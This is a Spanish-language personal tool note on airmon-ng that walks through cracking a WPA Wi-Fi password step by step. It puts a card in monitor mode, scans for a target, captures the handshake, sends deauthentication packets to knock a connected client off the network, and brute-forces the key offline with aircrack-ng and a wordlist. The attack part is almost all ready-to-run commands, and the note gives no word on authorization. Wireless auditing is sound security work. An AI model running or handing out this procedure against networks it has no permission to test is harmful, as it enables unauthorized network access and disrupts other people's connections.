---
aliases:
tags:
primary categories:
secondary categories:
tertiary categories:
kind: Tool
linked:
---
# airmon-ng

***

### Activar el Modo Monitor

Primero, necesitas que tu tarjeta de red deje de conectarse normalmente y empiece a "escuchar" todo el tráfico aéreo.

Abre una terminal y verifica el nombre de tu interfaz de red:
```Bash
iwconfig
```

Supongamos que tu interfaz se llama `wlan0`. Para ponerla en modo monitor, ejecuta:
```Bash
sudo airmon-ng start wlan0
```

Si ejecutas `iwconfig` de nuevo, verás que tu interfaz ahora probablemente se llama `wlan0mon`.

### Escanear el Entorno

Ahora vamos a escanear las redes disponibles a tu alrededor para identificar nuestro objetivo.
```Bash
sudo airodump-ng wlan0mon
```

Deja que corra unos segundos hasta que veas la red que quieres auditar. Toma nota de dos datos cruciales: el **BSSID** (la dirección MAC del router) y el **CH** (el canal en el que opera). Presiona `Ctrl+C` para detener el escaneo.

### Capturar el Handshake

El objetivo es interceptar el momento en que un dispositivo legítimo se conecta al router. Para esto, enfocamos nuestra antena solo en la red objetivo y guardamos el tráfico en un archivo.
```Bash
sudo airodump-ng -c [canal] --bssid [MAC_del_router] -w captura_red wlan0mon
```

Reemplaza `[canal]` y `[MAC_del_router]` con los datos del Paso 2. Esta terminal debe quedarse abierta ejecutándose.

### Forzar la desconexión (Ataque Deauth)

Si ya hay un cliente conectado a la red, no vamos a esperar a que se desconecte y vuelva a conectarse por su cuenta. Vamos a expulsarlo brevemente para que su dispositivo se reconecte automáticamente, generando así el handshake.

Abre **otra terminal** y ejecuta:
```Bash
sudo aireplay-ng -0 2 -a [MAC_del_router] -c [MAC_del_cliente] wlan0mon
```

El `-0 2` envía dos paquetes de desautenticación. Puedes encontrar la `[MAC_del_cliente]` en la parte inferior de la terminal que dejaste abierta en el Paso 3. Si todo sale bien, en la terminal del Paso 3 aparecerá un mensaje en la parte superior derecha que dice **"WPA handshake: [MAC_del_router]"**.

### El Crackeo Offline

Una vez que tienes el handshake, ya no necesitas estar cerca de la red. Puedes detener la captura (`Ctrl+C`) y devolver tu tarjeta a la normalidad:
```Bash
sudo airmon-ng stop wlan0mon
```

Ahora entra en juego el ataque de fuerza bruta usando un diccionario (un archivo de texto con miles de contraseñas comunes). El archivo de captura se habrá guardado con el nombre `captura_red-01.cap`.
```Bash
sudo aircrack-ng -w /ruta/a/tu/diccionario.txt -b [MAC_del_router] captura_red-01.cap
```

Si la contraseña real de la red está dentro de tu archivo de diccionario, Aircrack-ng la encontrará y te mostrará el mensaje **KEY FOUND!**.


***